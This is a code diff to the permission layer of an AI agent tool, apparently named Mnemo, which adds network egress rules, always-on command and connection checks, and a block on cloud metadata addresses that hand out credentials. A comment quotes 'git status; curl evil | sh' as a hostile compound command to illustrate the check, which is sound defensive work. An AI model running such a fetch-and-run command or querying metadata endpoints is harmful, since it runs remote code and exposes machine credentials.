@@ -22,6 +22,7 @@ import { COMPOUND, commandSegments, decide } from "../policy/gate.ts";
 import { nativeSystem, realTarget, within, type PathSystem } from "../policy/paths.ts";
 import type { ApprovalRequest } from "../runtime/dialogs.ts";
 import type { Host } from "./host.ts";
+import { hostsIn, isMetadata, normalHost } from "../policy/egress.ts";
 
 const READ = new Set(["read", "grep", "find", "ls", "memory_search", "memory_remember", "memory_steer", "spawn_subagent", "list_agents", "message_agent", "tool_search"]);
 /** Read-class tools that still write to memory: plan mode is "change nothing", memory included. */
@@ -407,11 +408,31 @@ export function denial(rules: readonly Rule[], cwd: string, tool: string, input:
   return denied && refusedBy(denied);
 }
 
-/** Which of a cell's own actions any deny rule could stop, so the kernel checks only those. */
-export function kernelGuard(rules: readonly Rule[]): { exec: boolean; read: boolean; write: boolean } {
+/** Which of a cell's own actions the kernel checks: reads and writes only when a deny rule could stop them. */
+export function kernelGuard(rules: readonly Rule[]): { exec: boolean; read: boolean; write: boolean; net: boolean } {
   const deny = rules.filter((r) => r.action === "deny");
   const names = (...tools: string[]) => deny.some((r) => tools.some((t) => globMatch(r.tool, t)));
-  return { exec: names("bash"), read: names("read"), write: names("write", "edit") };
+  // Commands and connections are always checked: the metadata block holds with no rules at all.
+  return { exec: true, read: names("read"), write: names("write", "edit"), net: true };
+}
+
+/**
+ * What `net` rules say about connecting to these hosts: refused (a deny, or a cloud metadata
+ * address no allow rule opens), asked (an `ask` rule, which beats any allow for the command),
+ * or nothing to say.
+ */
+export function egress(rules: readonly Rule[], hosts: readonly string[]): { refuse: string } | { ask: Rule } | undefined {
+  let ask: Rule | undefined;
+  for (const raw of hosts) {
+    const host = normalHost(raw);
+    const denied = rules.find((r) => r.action === "deny" && ruleHits(r, "net", [host], true));
+    if (denied) return { refuse: `${refusedBy(denied)} It connects to ${host}.` };
+    const first = rules.find((r) => r.action !== "deny" && ruleHits(r, "net", [host], true));
+    if (isMetadata(host) && first?.action !== "allow")
+      return { refuse: `${host} is a cloud metadata address, which hands out this machine's credentials, so Mnemo does not connect to it. Add {"tool": "net", "pattern": "${host}", "action": "allow"} to permissions.json if you mean to.` };
+    if (first?.action === "ask") ask ??= first;
+  }
+  return ask ? { ask } : undefined;
 }
 
 export type Verdict = { allow: true } | { allow: false; reason: string } | { ask: ApprovalRequest; pattern?: string };
@@ -431,6 +452,9 @@ export function judge(
   // the command or path is dressed up.
   const denied = rules.find((r) => r.action === "deny" && ruleHits(r, tool, subjects, ci));
   if (denied) return { allow: false, reason: refusedBy(denied) };
+  // Where a command connects, in every mode: `net` deny rules and the metadata block.
+  const net = command ? egress(rules, hostsIn(subject)) : undefined;
+  if (net && "refuse" in net) return { allow: false, reason: net.refuse };
   // Before any allow: plan mode is the user saying "change nothing", and a standing
   // allow rule was written for the other modes.
   if ((kind !== "read" || WRITES_MEMORY.has(tool)) && host.mode === "plan")
@@ -444,6 +468,8 @@ export function judge(
   );
   // An allow for `git status*` is not an allow for `git status; curl evil | sh`.
   if (rule?.action === "allow" && command && COMPOUND.test(subject)) rule = undefined;
+  // A host someone wants asked about is asked about, whatever allowed the command.
+  if (net) rule = net.ask;
   rule ??= rules.find((r) => r.action === "ask" && ruleHits(r, tool, subjects, ci));
   if (rule?.action === "allow") return { allow: true };
   if (kind === "read" && secretPath(host, cwd, input.path, sys))
